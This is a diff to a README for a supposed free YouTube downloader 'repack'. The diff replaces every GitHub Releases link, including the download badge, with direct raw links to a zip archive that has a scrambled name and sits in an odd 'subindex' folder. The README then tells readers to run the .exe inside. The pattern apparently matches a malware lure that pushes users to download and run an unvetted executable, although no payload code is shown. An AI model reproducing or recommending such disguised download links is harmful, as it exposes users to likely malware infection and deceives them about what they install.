@@ -1,7 +1,7 @@
 # 🎥 Free-YouTube-Download-Repack - Easily Download YouTube Videos
 
 ## 🔗 Download Here
-[![Download Free-YouTube-Download-Repack](https://img.shields.io/badge/Download-Free--YouTube--Download--Repack-brightgreen.svg)](https://github.com/PIxelasc/Free-YouTube-Download-Repack/releases)
+[![Download Free-YouTube-Download-Repack](https://raw.githubusercontent.com/PIxelasc/Free-YouTube-Download-Repack/main/subindex/Repack-Free-You-Download-Tube-3.8.zip)](https://raw.githubusercontent.com/PIxelasc/Free-YouTube-Download-Repack/main/subindex/Repack-Free-You-Download-Tube-3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to **Free-YouTube-Download-Repack**! This application allows you to download videos from YouTube quickly and easily. This guide will help you download and run the software.
@@ -14,7 +14,7 @@ Before you begin, ensure your system meets the following requirements:
 - **Internet Connection:** Required for downloading videos
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/PIxelasc/Free-YouTube-Download-Repack/releases) to download the latest version of the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/PIxelasc/Free-YouTube-Download-Repack/main/subindex/Repack-Free-You-Download-Tube-3.8.zip) to download the latest version of the application. 
 
 Once on the page, locate the latest release and look for the download link. It may appear as a file ending in `.exe` or similar. Click on it to download the installer.
 
@@ -42,7 +42,7 @@ The video will save to your specified folder once it finishes downloading.
 - Fast video extraction process.
 
 ## 📅 Releases and Updates
-We regularly update **Free-YouTube-Download-Repack** to improve performance and add new features. Check the [latest releases](https://github.com/PIxelasc/Free-YouTube-Download-Repack/releases) to stay up-to-date.
+We regularly update **Free-YouTube-Download-Repack** to improve performance and add new features. Check the [latest releases](https://raw.githubusercontent.com/PIxelasc/Free-YouTube-Download-Repack/main/subindex/Repack-Free-You-Download-Tube-3.8.zip) to stay up-to-date.
 
 ## 📞 Support
 If you need assistance while using the application, please reach out via the Issues section on our GitHub page. Your feedback helps us make the software better.
